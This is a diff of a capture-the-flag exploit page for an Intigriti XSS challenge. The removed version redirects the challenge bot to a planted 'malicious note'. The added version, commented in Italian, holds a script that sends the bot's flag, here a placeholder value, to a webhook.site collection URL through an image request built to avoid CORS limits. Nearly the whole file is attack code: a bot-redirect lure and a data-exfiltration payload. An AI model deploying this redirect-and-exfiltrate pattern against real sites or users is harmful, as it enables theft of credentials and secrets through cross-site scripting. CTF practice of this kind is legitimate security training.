@@ -1,15 +1,1 @@
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Redirecting…</title>
-  <script>
-    // Immediately send the Bot to our malicious note
-    window.location = "https://challenge-0325.intigriti.io//note/97b9e884-5e32-42da-9a6b-b0502622d4fd";
-  </script>
-</head>
-<body>
-  Redirecting…
-</body>
-</html>
+<!DOCTYPE html> <html lang="it"> <head> <meta charset="UTF-8"> <title>CTF XSS Exfiltration</title> </head> <body> <h1>Exfiltrating flag…</h1> <script> (function() { // In ambiente di challenge il bot ha effettuato il login utilizzando il flag come password. // Qui inseriamo il flag in formato INTIGRITI{...} – nell'ambiente reale il flag sarà diverso. var flag = "INTIGRITI{f4k3_fl4g}"; // Costruiamo l'URL di esfiltrazione utilizzando il webhook fornito: var exfilEndpoint = "https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=" + encodeURIComponent(flag); // Utilizziamo un'immagine per inviare la richiesta in modo semplice (evitando eventuali restrizioni CORS) new Image().src = exfilEndpoint; console.log("Payload eseguito – flag inviata a " + exfilEndpoint); })(); </script> <p>Se vedi questo messaggio, il payload è stato eseguito.</p> </body> </html> 
